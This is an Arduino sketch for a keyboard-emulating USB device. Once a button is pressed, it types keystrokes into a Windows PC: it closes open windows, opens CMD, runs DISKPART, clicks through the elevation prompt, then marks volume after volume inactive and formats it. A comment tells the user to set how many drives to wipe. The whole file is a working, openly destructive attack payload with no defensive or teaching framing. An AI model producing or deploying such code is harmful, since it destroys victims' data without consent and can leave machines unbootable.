#include "Keyboard.h"
#include "Mouse.h"

#define blinkInterval 50
#define ledPin 3
#define buttonPin 6
#define Drive_Count 6 //Put the number of drives to format here (keep in mind they may not be in order on the pc so I reccomend 5-9)

int defaultDelay = 4;
int defaultCharDelay = 5;
int rMin = 0;
int rMax = 100;
int VOLUME_CYCLE = 0;

int counter;

bool ledOn = true;

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void setup()
{
 pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
   if(digitalRead(buttonPin) == LOW){

    Keyboard.begin();
    Mouse.begin();
   }
}

void loop()
{
  if (VOLUME_CYCLE < 4) {
    while (VOLUME_CYCLE < Drive_Count) {
      // main script
    if(digitalRead(buttonPin) == LOW){
    
    Keyboard.begin();
    Mouse.begin();
    delay(4000);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(40);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(40);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(114);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.print("CMD");

    delay(defaultDelay);
    delay(300);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.print("DISKPART");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(1500);

    delay(defaultDelay);
    typeKey(KEY_LEFT_ARROW);

    delay(defaultDelay);
    delay(400);

    delay(defaultDelay);
    typeKey(KEY_LEFT_ARROW);

    delay(defaultDelay);
    delay(200);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(800);

    delay(defaultDelay);
    Keyboard.print("LIST VOLUME ");
    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(400);

    delay(defaultDelay);
    Keyboard.print("SELECT VOLUME ");
    Keyboard.print(VOLUME_CYCLE);
    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(200);

    delay(defaultDelay);
    Keyboard.print("INACTIVE");
    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(300);

    delay(defaultDelay);
    Keyboard.print("SELECT VOLUME ");
    Keyboard.print(VOLUME_CYCLE);
    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("FORMAT");
    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(14000);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(40);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(40);

      VOLUME_CYCLE += 1;
    }
    }
  } else {
    if (VOLUME_CYCLE < Drive_Count) {
      // endscript
      Keyboard.end();
    } else {
      for (counter = 0; counter < 10; ++counter) {
        // FLASHY BOI
        ledOn = !ledOn;
  digitalWrite(ledPin, ledOn);
  delay(blinkInterval);
      }
    }
  }
}
